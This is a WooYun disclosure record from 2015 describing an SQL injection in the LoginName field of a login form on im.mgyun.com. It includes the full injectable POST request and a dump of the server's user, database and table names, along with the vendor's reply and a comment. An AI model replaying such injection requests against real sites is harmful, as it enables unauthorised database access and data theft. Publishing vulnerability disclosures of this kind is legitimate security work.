{"id": 41906, "wybug_id": "wooyun-2015-0103479", "wybug_title": "刷机大师某站点MSSQL注射(支持union)", "wybug_corp": "mgyun.com", "wybug_author": "lijiejie", "wybug_date": "2015-03-26 18:13", "wybug_open_date": "2015-05-10 19:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向公众公开  简要描述： 刷机大师某站点MSSQL注射(支持union)，大量数据库 详细说明：  注入点：\nPOST / HTTP/1.1Content-Length: 110Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://im.mgyun.com/Cookie: ASP.NET_SessionId=Host: im.mgyun.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*LoginName=test*&Password=test&VerifyCode=\n参数LoginName可注入。支持union，可报错。   漏洞证明：  \n\ncurrent user:    'installmasteruser'current db  :    'InstallMaster'Server Name :    'XINYI-104'数据库：\navailable databases [38]:[*] AnalyzeSystem[*] ApkGrabDB[*] AppCoolPoints[*] BaiduromLottery[*] CPAPPLog[*] DataCollectDB[*] DataService_Devices[*] DataService_Models2[*] DataService_PCD[*] distribution[*] friendlinks[*] InstallMasterLog[*] IntegralMall[*] KeywordLog[*] LuckyDraw2013[*] Mailman[*] master[*] MgyunAPI[*] model[*] msdb[*] OpenPlatform[*] OSMF[*] ProductDownLog[*] ProductManager[*] productmanagerstatistics[*] PushAppStatistics[*] ReportServer[*] ReportServerTempDB[*] RomActiveLog[*] RomChecker[*] RomDownLog[*] RomJDv3_1[*] RomResource_Shadow[*] tempdb[*] UCenter[*] UserPointsLog[*] XGPushManagerDB[*] XYAdmin\n\nDatabase: InstallMaster[87 tables]+-----------------------+| AppClass              || AppClass              || AppConfig             || AppList               || AppSummary            || AppToInstallSchemeRel || AppVersion            || CPStatus_Summary      || CPStatus_Week         || CP_Account            || CP_AccountV1          || CP_Activated          || CP_AdminAPP           || CP_AdminArea          || CP_AdminStore         || CP_Article            || CP_Config             || CP_DayAppInfo         || CP_DayAppInfoV1       || CP_DayLayerMoney      || CP_DayLayerMoneyV1    || CP_DayPeploeMoney     || CP_DayPeploeMoneyV1   || CP_DecrementConfig    || CP_Dynamic            || CP_Flow               || CP_Install            || CP_P_Manager          || CP_P_ManagerV1        || CP_P_UserToManager    || CP_P_UserToManagerV1  || CP_ShareRatio         || CP_WithDrawInfo       || CP_WithDrawInfoState  || ClientLog             || ClientLog             || ClientMenuCatagory    || ClientMenuCatagory    || Config                || DailyUserList         || DateTime              || Devices               || EmailActivate         || FakeUserPoint         || HistoryStore          || IEMIAPackageName      || IMEIDetail            || IMEIToUser            || ImmediateUserList     || InstallIMEIList       || InstallScheme         || InstallTime           || LayerRelation         || MSummary              || Message               || MobileList            || MyDateTime            || OnLineClient          || OnLineClient          || OnLineStore           || OperationLog          || OrgLayer              || Organization          || PhoneMarketSupplier   || PhoneMarketTransLog   || PhoneMarketUser       || PointEventLimit       || PointEventLimit       || PointSource           || PointSum_Daily        || PointSum_Event        || PointSum_Monthly      || PointSum_Weekly       || PointSum_Yearly       || PointsLog             || ResetPwdRequest       || Role                  || SendSMSLog            || ShareRatio            || TempMSummary          || UserDetail            || UserDetail            || UserList              || UserPointsInt         || UserPointsInt         || WebConfig             || sysdiagrams           |+-----------------------+\n   修复方案：  参数过滤和转义   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-03-26 19:18 厂商回复： 多谢白帽子及乌云平台的提醒和帮助。该漏洞属于低级错误，不可原谅。今后我们将加强代码的安全检测。该站点属于我司已关停的业务，现已经停止访问。该数据库连接账户无其它数据库访问权限。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-11 01:44 |    \t\t蛋清 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        )\t\t \n  低级错误才给5rank？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}